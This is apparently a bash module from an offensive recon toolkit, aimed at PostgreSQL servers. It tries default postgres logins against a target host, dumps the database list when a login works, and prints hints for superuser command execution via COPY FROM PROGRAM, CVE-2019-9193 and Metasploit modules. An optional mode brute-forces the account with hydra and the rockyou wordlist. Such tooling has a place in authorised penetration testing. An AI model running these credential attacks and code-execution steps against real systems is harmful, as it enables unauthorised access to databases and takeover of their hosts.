#!/usr/bin/env bash
# recce-service: PostgreSQL (5432) - default creds, RCE via COPY/language
. "$(cd "$(dirname "$0")/.." && pwd)/lib.sh"
T="$1"; P="${2:-5432}"; [ "$3" = "-a" ] && AGGR=1
svc_start "POSTGRES" "$T" "$P"

nse "$T" "$P" "pgsql-info"
if have psql; then
  info "default-cred test (postgres/postgres, postgres/<blank>):"
  for creds in "postgres:postgres" "postgres:"; do
    u=${creds%%:*}; p=${creds#*:}
    if PGPASSWORD="$p" psql -h "$T" -p "$P" -U "$u" -d postgres -w -c 'select version();' 2>/dev/null | grep -qi postgresql; then
      find_ "PostgreSQL login works: $u / '${p:-<blank>}'"
      PGPASSWORD="$p" psql -h "$T" -p "$P" -U "$u" -d postgres -w -c '\l' 2>/dev/null | sed 's/^/      /'
      note "superuser RCE: COPY ... FROM PROGRAM 'id'  (>= 9.3);  or CVE-2019-9193"
      note "  impacket-style: metasploit auxiliary/admin/postgres/postgres_sql, or exploit/.../postgres_payload"
      break
    fi
  done
else info "(psql not installed - apt install postgresql-client)"; fi

if aggr; then sec "Postgres brute (intrusive)"; need hydra && run hydra -l postgres -P /usr/share/wordlists/rockyou.txt -f "postgres://$T:$P"
else skip_aggr "hydra postgres brute"; fi
